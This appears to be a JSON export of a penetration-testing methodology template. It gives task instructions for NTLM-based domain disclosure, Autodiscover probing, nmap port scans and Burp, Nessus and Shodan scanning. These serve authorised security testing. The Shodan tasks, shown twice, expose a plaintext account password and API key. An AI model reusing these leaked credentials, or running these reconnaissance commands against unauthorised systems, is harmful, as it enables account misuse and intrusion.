                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Information Disclosure - ADS Domain - NTLM Supported",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41becb4-2af0-11ee-91d3-8317597146ae",
                        "ordinal": 0,
                        "masterFindingId": 17063468,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\n1. Identify interfaces that support NTLM.\n2. Send authenticated request.\n3. Parse information from the response.\n4. If its possible to leak information, add the associated finding, and add verification that has the command and output.\n\n<h2><b>For Autodiscover:</b></h2>\nIdentify internal, managed, and federated active directory domains.\n\nThe Autodiscover service minimizes user configuration and deployment steps by providing clients access to Exchange features. For Exchange Web Services (EWS) clients, Autodiscover is typically used to find the EWS endpoint URL. However, Autodiscover can also provide information to configure clients that use other protocols. Autodiscover works for client applications that are inside or outside firewalls and in resource forest and multiple forest scenarios.\n\nAs part of this service, an RPC over HTTP (&quot;Outlook Anywhere&quot;) feature can be configured, resulting in the presence of the https://autodiscover.domain.com/rpc URL.  RPC over HTTP, also known as Outlook Anywhere, is a legacy method of connectivity and transport between Outlook for Windows and Exchange. In May 2014, Microsoft introduced MAPI over HTTP as a replacement for RPC over HTTP.\n\nStarting on October 31, 2017, RPC over HTTP will no longer be a supported protocol for accessing mail data from Exchange Online. However, organizations may still support this feature depending on their Exchange configuration.\n\n<h2>Variation: Manual Process using Burp</h2>\n1. Start Burp and proxy your browser traffic through it.\n\n2. For each domain enumerated in scope attempt to access the autodiscover subdomain's RPC URL to identify potential Active Directory domains.\n<h3>Example:</h3>\n<ncode>https://autodiscover.domain.com/rpc\n</ncode>\n3. When prompted for credentials by the website, enter any username/password combination (invalid credentials are fine).\n\n4. Copy the value (bold portion below) from the WWW-Authenticate header that is returned by the server.\n<h3>Example:</h3>\n<ncode>WWW-Authenticate: NTLM <b>TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=</b>\n</ncode>\n5. Base64-decode the value and review it for internal domain names. Note that not all characters will be printable:\n<h3>Example:</h3>\n<ncode><b>&#35; echo &quot;TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=&quot; | base64 -d\n</b>NTLMSSP8\n98AMSAMSW0095AP20&quot;<b>subdomain.domain.com</b>6W0095AP20.subdomain.domain.comdomain.com\n</ncode>\n<h2><b>For specific URLs use:</b></h2>\n<b>Tool:</b> NTLM Challengers\n<b>Source:</b> https://b17zr.com/2020/02/02/ntlm-challenger/\n<h3>Example:</h3>\n<ncode><b>python3 ntlm_challenger.py 'https://autodiscover.hackin.club/autodiscover/autodiscover.xml'\n\nTarget (Domain): HACKIN\n\nVersion: Server 2012 / Windows 8 (build 9200)\n\nTargetInfo:\nMsvAvNbDomainName: HACKIN\nMsvAvNbComputerName: EXCH01\nMsvAvDnsDomainName: hackin.club\nMsvAvDnsComputerName: EXCH01.hackin.club\nMsvAvDnsTreeName: hackin.club\nMsvAvTimestamp: Nov 3, 2019 01:07:16.573170\n\nNegotiate Flags:\nNTLMSSP_NEGOTIATE_UNICODE\nNTLMSSP_REQUEST_TARGET\nNTLMSSP_NEGOTIATE_ALWAYS_SIGN\nNTLMSSP_TARGET_TYPE_DOMAIN\nNTLMSSP_NEGOTIATE_EXTENDED_SESSIONSECURITY\nNTLMSSP_NEGOTIATE_TARGET_INFO\nNTLMSSP_NEGOTIATE_VERSION</b>\n</ncode>\n<h2><b>For direct protocol access check use:</b></h2>\n<b>Tool:</b> Nmap\nRun the following nmap scripts to identify domain information:\n<b>Note:</b> Grab targets from informational findings based on the protocol.\nFor example make sure to target all web servers listed under the finding &quot;HTTP - Service Uses Protocol&quot;.\n<ncode>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP\nnmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL\nnmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM\nnmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM\nnmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM\nnmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM\nnmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM\n</ncode>\n<b>AIO:</b>\n<ncode>nmap -p80,443 --script http-ntlm-info -iL hosts -oA nmap-NTLM-HTTP &amp;&amp; nmap -p1433 --script ms-sql-ntlm-info -iL hosts -oA nmap-NTLM-SQL &amp;&amp; nmap -p143,993 --script imap-ntlm-info -iL hosts -oA nmap-IMAP-NTLM &amp;&amp; nmap -p119,433,563 --script nntp-ntlm-info -iL hosts -oA nmap-NNTP-NTLM &amp;&amp; nmap -p110,995 --script pop3-ntlm-info -iL hosts -oA nmap-POP3-NTLM &amp;&amp; nmap -p25,465,587 --script smtp-ntlm-info -iL hosts -oA nmap-SMTP-NTLM &amp;&amp; nmap -p23 --script telnet-ntlm-info -iL hosts -oA nmap-TELNET-NTLM\n</ncode>\n<h2><b>RDP (Only in restricted Admin mode)</b></h2>\nBelow are some common tools that can be used:\n<b>Metasploit</b>\nhttps://www.rapid7.com/db/modules/auxiliary/scanner/http/ntlm_info_enumeration\nhttps://www.rapid7.com/db/modules/auxiliary/scanner/http/owa_ews_login\n<b>Nmap</b>\nhttps://github.com/GDSSecurity/Nmap-Scripts/tree/master/NTLM-Info-Disclosure\nhttps://nmap.org/nsedoc/scripts/http-ntlm-info.html\nhttps://nmap.org/nsedoc/scripts/imap-ntlm-info.html\n<ncode>nmap -p443,80 --script http-ntlm-info -iL hosts\nnmap -v -Pn -sS -p443 -script http-ntlm-info -script-args http-ntlm-info.root=/abs/ dialin.contoso.com\n</ncode>\n<b>NetSPI</b>\nhttps://github.com/NetSPI/NTLMHTTPparser\n<h2><b>Reporting Requirements</b></h2>\nPlease include the tool output or a list of enumerated Active Directory domains in the task details/notes.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Information Disclosure - ADS Domain - Lync Discovery Service",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41bb992-2af0-11ee-91d2-cb1689c8f023",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nFor each domain enumerated in scope attempt to access the lync discovery subdomain to identify potential Active Directory domains.\n\n<h2><b>Variation: Manual Review</b></h2>\n1. For each domain enumerated in scope attempt to access the lync discovery subdomain to identify potential Active Directory domains.\n<h3>Example:</h3>\n<ncode>https://lyncdiscover.domain.com/\n</ncode>\n\n<h2><b>Reporting Requirements</b></h2>\nReport the ADS domains in the task notes or add to Artifacts.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Information Disclosure - ADS Domain - RDP Drop Downs",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41c5fa0-2af0-11ee-91d6-930568ed3569",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nIf network layer authentication is not enabled, review the RDP drop list for Active Directory domains. If there are large number of RDP servers accessible from the internet a sample may be sufficient.\n\nTarget informational findings that have identified RDP or review the open port list for systems listening on port 3389.\n\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Information Disclosure - ADS Domain - Autodiscover Service",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41cc72e-2af0-11ee-91d9-3f467b6bfe61",
                        "ordinal": 2,
                        "masterFindingId": 17063468,
                        "taskInstructions": "<h2>Instructions</h2>\nIdentify internal, managed, and federated active directory domains.\n\nThe Autodiscover service minimizes user configuration and deployment steps by providing clients access to Exchange features. For Exchange Web Services (EWS) clients, Autodiscover is typically used to find the EWS endpoint URL. However, Autodiscover can also provide information to configure clients that use other protocols. Autodiscover works for client applications that are inside or outside firewalls and in resource forest and multiple forest scenarios.\n\nAs part of this service, an RPC over HTTP (&quot;Outlook Anywhere&quot;) feature can be configured, resulting in the presence of the https://autodiscover.domain.com/rpc URL.  RPC over HTTP, also known as Outlook Anywhere, is a legacy method of connectivity and transport between Outlook for Windows and Exchange. In May 2014, Microsoft introduced MAPI over HTTP as a replacement for RPC over HTTP. \n\nStarting on October 31, 2017, RPC over HTTP will no longer be a supported protocol for accessing mail data from Exchange Online. However, organizations may still support this feature depending on their Exchange configuration.\n\n<h2>Variation: Manual Process using Burp</h2>\n1. Start Burp and proxy your browser traffic through it.\n\n2. For each domain enumerated in scope attempt to access the autodiscover subdomain's RPC URL to identify potential Active Directory domains.\n<h3>Example:</h3>\n<ncode>https://autodiscover.domain.com/rpc\n</ncode>\n3. When prompted for credentials by the website, enter any username/password combination (invalid credentials are fine).\n\n4. Copy the value (bold portion below) from the WWW-Authenticate header that is returned by the server.\n<h3>Example:</h3>\n<ncode>WWW-Authenticate: NTLM <b>TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=</b>\n</ncode>\n5. Base64-decode the value and review it for internal domain names. Note that not all characters will be printable:\n<h3>Example:</h3>\n<ncode><b>&#35; echo &quot;TlRMTVNTUAACAAAABgAGADgAAAAFgomiwRzZSRUKShsAAAAAAAAAAK4ArgA+AAAACgA5OAAAAA9BAE0AUwACAAYAQQBNAFMAAQASAFcAMAAwADkANQBBAFAAMgAwAAQAIgBhAG0AcwAuAGIAbgB5AG0AZQBsAGwAbwBuAC4AbgBlAHQAAwA2AFcAMAAwADkANQBBAFAAMgAwAC4AYQBtAHMALgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAUAGgBiAG4AeQBtAGUAbABsAG8AbgAuAG4AZQB0AAcACAD7qrDJRlzVAQAAAAA=&quot; | base64 -d</b>\nNTLMSSP8\n98AMSAMSW0095AP20&quot;<b><red>subdomain.domain.com</red></b>6W0095AP20.subdomain.domain.comdomain.com\n</ncode>\n<h2><b>Reporting Requirements</b></h2>\nReport the ADS domains in the task notes.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Information Disclosure - ADS Domain - OS Int Sources",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41c24a4-2af0-11ee-91d4-af47796b0fdf",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nIf you have spare time on a project and can identify additional data source please try them and bring them to the team for further evaluation.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 8,
                "id": 350457,
                "name": "Information Gathering: Live Systems [ASM] ",
                "description": "This goal of this task group is to identify live systems.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "[ASM] Discovery Scanning - TCP",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41cf410-2af0-11ee-91db-cfc3ddcabd12",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform discovery scanning to identify service on well known TCP ports. \n<b>Note: </b>This step is only required if the number of systems in scope is greater than 100.\n\n<h2><b>Variation: Nmap</b></h2>\nPerform discovery scanning to identify live systems.\n<b>Note:</b> This step is only required if the number of systems in scope is greater than 100. In most cases the commands below will be fine. However, in sensitive environments you may need to throttle the scans down to T3 or T2.\n\n1. Run the TCP port discovery scan using the nmap command below.\n<ncode>nmap -sS -Pn -n -T4 --min-hostgroup 128 --max-retries 0 -p21,22,23,25,53,79,80,81,110,139,143,443,445,465,514,993,1433,3306,1521,5432,2902,5800,5900,3389,8000,8300,8080,8500,8501,8433,8888,51010,9090,9100,10000 -iL hosts -oA Client-TCP-Disco\n</ncode>\n<h2><b>Report Requirements</b></h2>\nImport the XML output format into the Sources page in Resolve.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] Discovery Scanning - UDP",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41d2eb2-2af0-11ee-91de-979a20c59193",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform UDP port scanning of common ports.  \n<b>Note: </b>This step is only required if the number of systems in scope is greater than 100.\n\n<h2><b>Variation: Nmap</b></h2>\n<b>Note: </b>In most cases the commands below will be fine. However, in sensitive environments you may need to throttle the scans down to T3 or T2.\n\n1. Run the UDP port scan using the nmap command below.\n<ncode>nmap -sU -sV -T4 -Pn -p53,69,161,111,123,514 -iL hosts -oA Client-UDP\n</ncode>\n<h2><b>Report Requirements</b></h2>\nImport the XML output format into the Sources page in Resolve.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] Full Port Scan - TCP",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41d20fc-2af0-11ee-91dd-3bbd143f2016",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform TCP port scanning against all ports.\n<b>Note:</b> This should be executed after full port vulnerability scanning with the goal of obtaining more accurate fingerprinting. This should be executed as time allows.\n\n<h2><b>Variation: Nmap</b></h2>\n<b>Note: </b>In most cases the commands below will be fine. However, in sensitive environments you may need to throttle the scans down to T3 or T2.\n\n1. Run the scan.\n<ncode>nmap -sS -sV -O -T4 -Pn -p- --min-hostgroup 128 --max-retries 0 -iL hosts -oA Client-TCP-Full\n</ncode>\n<h2>Report Requirements</h2>\nImport the XML output format into the Sources page in Resolve.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[ASM] Discovery Scanning - Ping",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41ce7d6-2af0-11ee-91da-d3c6f79b01a3",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform discovery scanning using ping to help identify live systems.\n<b>Note: </b>This step is only required if the number of systems in scope is greater than 100.\n\n<h2><b>Variation: Nmap</b></h2>\n1. Run the ping scan using the nmap command below.\n<ncode>nmap -sn -iL hosts -oA Client-Ping\n</ncode>\n<b>Note:  </b>This is not accurate in all environments.  In most cases you will have to conduct a TCP/UDP discovery port scan to get a reliable list of live systems.\n\n<h2><b>Report Requirements</b></h2>\nImport the scan results into the Sources page in Resolve.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Discovery Scanning - Shodan",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41d01d0-2af0-11ee-91dc-a3531724ec6b",
                        "ordinal": 4,
                        "masterFindingId": 17063878,
                        "taskInstructions": "<h2>Instructions</h2>\nReview Shodan data for available ports and services.\n\n<h2>Variation: smap</h2>\n1. Download the latest release, or download the source and build with go.\n<ncode>go install -v github.com/s0md3v/smap/cmd/smap@latest\n</ncode>\nOR\n<ncode>git clone https://github.com/s0md3v/Smap.git\ncd Smap/cmd/smap\ngo build\n</ncode>\n2. Run the tool.\n<h3>Example:</h3>\n<ncode>./smap -oS - scanme.nmap.org\n\n        Smap (0.1.0-rc)\n\n+ 45.33.32.156 (scanme.nmap.org, scanme.nmap.org)\n  - OS: MiniBSD\n  - Tags: cloud\n  + Ports:\n    - 80 tcp/http cpe:/a:apache:http_server:2.4.7\n    - 22 tcp/ssh?\n    - 123 tcp/ntp?\n  - Vulns: CVE-2018-1312, CVE-2015-3185, CVE-2016-0736, CVE-2014-0231, CVE-2017-7679, CVE-2019-0220, CVE-2014-8109, CVE-2018-1283, CVE-2017-15715, CVE-2016-8612, CVE-2016-2161, CVE-2014-3523, CVE-2014-0118, CVE-2014-0226, CVE-2018-17199, CVE-2014-0117, CVE-2017-15710, CVE-2015-3184, CVE-2017-9798, CVE-2013-6438, CVE-2016-4975, CVE-2014-0098, CVE-2017-9788, CVE-2016-8743\n</ncode>\n<h2>Variation: Manual</h2>\n1. Log into shodan.io\n<ncode>https://account.shodan.io/\n</ncode>\nWeb Login:\n<ncode>User: ipsten\nPass: tCi6VdPE5p1QyGBTfNkMzIy0qoon89qqZrLwYk\n</ncode>\nAPI Key (for any tools that could use it):\n<ncode>TsAUQ1SFV04sjSQIjD2ympPfF0jLe2Sz\n</ncode>\n2. Attempt to identify useful information for in scope IP addresses. Consider searching by IP, IP range, and company name.  Below are some examples.\n<ul><li>org:&quot;comcast&quot;</li>\n<li>org:&quot;comcast&quot; city:minneapolis</li>\n<li>net:206.209.112.0/24</li>\n<li>port:443</li>\n<li>product:&quot;SonicWALL firewall http config&quot; port:&quot;443&quot;</li>\n<li>Apache city:&quot;San Francisco&quot; port:&quot;8080&quot; product:&quot;Apache Tomcat/Coyote JSP engine&quot;</li>\n<li>ameriprise org:&quot;Amazon.com&quot;</li>\n</ul>\n<h3><b>Report Verification</b></h3>\nInclude copies of relevant data in the task notes and be sure to create findings for identified vulnerable versions. You may also be able to recover subdomains for targeting. Also, watch for the use of AWS and Azure.\n\n<h3>More Notes</h3>\n<b>Note:</b> Ryan K is working on  a database and api.\nLink to information finding - users exposed in breach data.\nWe need to add a finding to the &quot;Vulnerability Enumeration: Manual Findings&quot; category:\n<ul><li>Run shodan dump to get basic service information</li>\n</ul>\nCommon use cases for data\n<ul><li>determine if we are being blocked by ips</li>\n<li>choose systems for sampled testing after discovery scanning / dump</li>\n<li>identify potential vulnerabilities</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 10,
                "id": 350458,
                "name": "Vulnerability Enumeration: Automated Scanning",
                "description": "The goal of this task group is to identify vulnerabilities using automated scanners.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "[ASM] Web Layer - Burp Cluster Scan",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41d8920-2af0-11ee-91e3-4b3b8c46f37f",
                        "ordinal": 2,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nPerform one round of scanning for each identified web application and web server.\n\nBurp scanning should target all web servers (can be found in the &quot;HTTP - Service Uses Protocol&quot; finding) by IP and all in scope domain names identified during the reconnaissance phases.\n\nFor the domains, target 80 (HTTP) and 443 (HTTPS). DO NOT target ISP domains. They will not yield additional results.\nFor both IP addresses and domains, target HTTP and HTTPS. \n\n<b>Please ensure both Scan Monster IP addresses have been included in the kickoff doc or provided to the client:</b>\n\n<b>3.209.252.210</b>\n<b>34.225.243.190</b>\n\n<h2>Variation: Burp Suite Pro via Scan Monster</h2>\n1. Access Scan Monster via the Scan Monster tab in Resolve.\n\n2. Click the &quot;Add Scope&quot; button to add your scan scope.\n\n3. Provide a name for the scope.\n\n4. Paste your scan scope into the Scope box. Paste and excluded IPs or domains in the Scope Exceptions box.\n\n5. Click the &quot;New Scan&quot; button.\n\n6. Provide a Name for the scan.\n\n7. Select the desired scope name from the drop down menu.\n\n8. Select the appropriate Workflow from the drop down menu. This will normally be the External Penetration Test - Web workflow.\n\n9. Select the Workspace to import the data into from the drop down menu.\n\n10. Click the &quot;Start Scan&quot; button.\n\n<b>Important Note</b>\nPlease <b>do not perform authenticated</b> scanning of of web applications. Most of those web applications are production and simply crawling some of them can have unintended consequences. \n\n<h3><b>TODO</b></h3>\nBelow is a list of Burp plugins to add moving forward to help with some of the cloud and remote management interface detection:\n<ol><li>Create and add Burp plugin for cloud resource enumeration, VPN, Citrix, Web based Terminal Servers, and VMware horizon deployments.</li>\n<li>Add NTLM scraper to enumerate internal Active Directory domains.</li>\n<li>Add checks for workfolder and roaming profiles.</li>\n</ol>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Network Layer - NeXpose Scan (All Ports)",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41d3e66-2af0-11ee-91df-f36dfded9fd5",
                        "ordinal": 1,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAt least one round of NeXpose scanning should performed. However, two rounds should be performed as time allows. Please use the &quot;NetSPI Standard - no web&quot; profile. Please refer to the instructions for the detailed Nessus settings if needed.\n\n<h2>Variation: NeXpose Console</h2>\n1. Log into https://nexpose.netspi.com with your NeXpose application credentials.\n\n2. Create and run the scan using the &quot;<b>NetSPI Standard - no web</b>&quot; profile.\n\n3. Run the scan twice (when possible)\n\n4. Export both result sets using the xml type 2 format.\n\n5. Import the result into Resolve\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Network Layer - Nessus Scan (All Ports)",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41d76a6-2af0-11ee-91e2-9fa4b8b40052",
                        "ordinal": 0,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nAt least one round of Nessus scanning should performed. However, two rounds should be performed as time allows. Please use the standard NetSPI profile. Please refer to the instructions for the detailed Nessus settings if needed.\n\n<h2>Variation: Nessus Console</h2>\n1. Log into https://nessus.netspi.com or https://nessus2.netspi.com with your IT provided username and password.\n<b>Note:</b> Admin password is stored in password.netspi.com.\n\n2. Create and run the scan using the &quot;<b>NetSPI No Ping, No Web Checks</b>&quot; scanning profile with the most recent date.\n\n3. Name the scan using the standardized naming convention below.\n<ncode>Company-Year-Service-App-Name\n</ncode>\n<h3>Example:</h3>\n<ncode>NETSPI-2019-WaPen-Resolve-gkumar\n</ncode>\n<b>Note: </b>Please be aware that old scans will be deleted and it's up the consultant to download and save scans when needed.\n\n4. Run the scan twice (when possible).\n\n5. Export both result sets.\n\n6.. Import the result into Resolve.\n\n<h3>Additional Notes</h3>\nBelow are the is the Custom Nessus configuration if a new profile needs to be created on the fly or communicated to a client:\n<ncode>General Settings:\n        Always test the local Nessus host\n        Use fast network discovery\n\nPort Scanner Settings:\n        Scan all ports (1-65535)\n        Use netstat if credentials are provided\n        Use SYN scanner if necessary\n\nPing hosts using:\n        TCP\n        ARP\n        ICMP (2 retries)\n\nScan all devices, including:\n        Printers\n        Novell Netware hosts\n\nPerformance options:\n    30 simultaneous hosts (max)\n    4 simultaneous checks per host (max)\n    5 second network read timeout\n</ncode>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "[OPTIONAL] Network Layer - Shodan",
                        "state": 3,
                        "comments": 0,
                        "uid": "c41d6792-2af0-11ee-91e1-9f39bfd31d2e",
                        "ordinal": 4,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview Shodan results for potential vulnerabilities.\n\n<h2>Variation: smap</h2>\n1. Download the latest release, or download the source and build with go.\n<ncode>go install -v github.com/s0md3v/smap/cmd/smap@latest\n</ncode>\nOR\n<ncode>git clone https://github.com/s0md3v/Smap.git\ncd Smap/cmd/smap\ngo build\n</ncode>\n2. Run the tool.Example:\n<ncode>./smap -oS - scanme.nmap.org\n\n        Smap (0.1.0-rc)\n\n+ 45.33.32.156 (scanme.nmap.org, scanme.nmap.org)\n  - OS: MiniBSD\n  - Tags: cloud\n  + Ports:\n    - 80 tcp/http cpe:/a:apache:http_server:2.4.7\n    - 22 tcp/ssh?\n    - 123 tcp/ntp?\n  - Vulns: CVE-2018-1312, CVE-2015-3185, CVE-2016-0736, CVE-2014-0231, CVE-2017-7679, CVE-2019-0220, CVE-2014-8109, CVE-2018-1283, CVE-2017-15715, CVE-2016-8612, CVE-2016-2161, CVE-2014-3523, CVE-2014-0118, CVE-2014-0226, CVE-2018-17199, CVE-2014-0117, CVE-2017-15710, CVE-2015-3184, CVE-2017-9798, CVE-2013-6438, CVE-2016-4975, CVE-2014-0098, CVE-2017-9788, CVE-2016-8743\n</ncode>\n<h2>Variation: Manual</h2>\n1. Log into shodan.io\n<ncode>https://account.shodan.io/\n</ncode>\nWeb Login:\n<ncode>User: ipsten\nPass: tCi6VdPE5p1QyGBTfNkMzIy0qoon89qqZrLwYk\n</ncode>\nAPI Key (for any tools that could use it):\n<ncode>TsAUQ1SFV04sjSQIjD2ympPfF0jLe2Sz\n</ncode>\n2. Attempt to identify useful information for in scope IP addresses. Consider searching by IP, IP range, and company name.  Below are some examples.\n<ul><li>org:&quot;comcast&quot;</li>\n<li>org:&quot;comcast&quot; city:minneapolis</li>\n<li>net:206.209.112.0/24</li>\n<li>port:443</li>\n<li>product:&quot;SonicWALL firewall http config&quot; port:&quot;443&quot;</li>\n<li>Apache city:&quot;San Francisco&quot; port:&quot;8080&quot; product:&quot;Apache Tomcat/Coyote JSP engine&quot;</li>\n<li>ameriprise org:&quot;Amazon.com&quot;</li>\n</ul>\n<h3><b>Report Verification</b></h3>\nInclude copies of relevant data in the task notes and be sure to create findings for identified vulnerable versions.  You may also be able to recover subdomains for targeting. Also, watch for the use of AWS and Azure.\n\n<h3>More Notes</h3>\n<b>Note:</b> Ryan K is working on  a database and api.Link to information finding - users exposed in breach data. We need to add a finding to the &quot;Vulnerability Enumeration: Manual Findings&quot; category:\n<ul><li>Run shodan dump to get basic service information</li>\n</ul>\nCommon use cases for data\n<ul><li>determine if we are being blocked by ips</li>\n<li>choose systems for sampled testing after discovery scanning / dump</li>\n<li>identify potential vulnerabilities</li>\n</ul>\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify Scan Data",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41d55e0-2af0-11ee-91e0-671515c5f6cc",
                        "ordinal": 3,
                        "masterFindingId": null,
                        "taskInstructions": "<h2>Instructions</h2>\nReview automated scan data for anomalies.\n<h2>Scan Monster</h2>\n1. Verify that the Scan Monster data (nmap/Burp) was imported correctly when the scan is complete.\n2. Review the Sources tab and sanity check what was imported. Are any obvious scan types missing? Are any obvious websites missing that Burp should have scanned?\n3. If any of the expected scan data is missing, raise the concern in the &#35;services or &#35;dev-questions Slack channels to get assistance.\n<h2>ASM</h2>\n1. Review the CSV export data for accuracy.\n2. Review the Documents tab to ensure the CSV files were uploaded.\n<h2>Nessus/Nexpose</h2>\n1. Review the sources tab to verify the Nessus/Nexpose data was imported correctly.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    }
                ],
                "fields": []
            },
            {
                "ordinal": 0,
                "id": 350459,
                "name": "Project Setup",
                "description": "The goal of this group of tasks is to record the project information to help ensure the execution matches what was done during the project kickoff.",
                "categoryType": "None",
                "tasks": [
                    {
                        "name": "Update the Project Status",
                        "state": 2,
                        "comments": 0,
                        "uid": "c41df73e-2af0-11ee-91e9-0f698e8ea1a4",
                        "ordinal": 6,
                        "masterFindingId": null,
                        "taskInstructions": "<h2><b>Instructions</b></h2>\nMake sure the project status has been set to &quot;In Progress&quot;.\n",
                        "isTaskInstructionsVisible": true,
                        "isCommentMandatory": false,
                        "hasRelatedInstances": false
                    },
                    {
                        "name": "Verify Client Owns the Provided IPs",
                        "state": 2,
                        "comments": 1,
                        "uid": "c41e3d52-2af0-11ee-91ef-37f710c3b31b",
                        "ordinal": 8,
                        "masterFindingId": null,
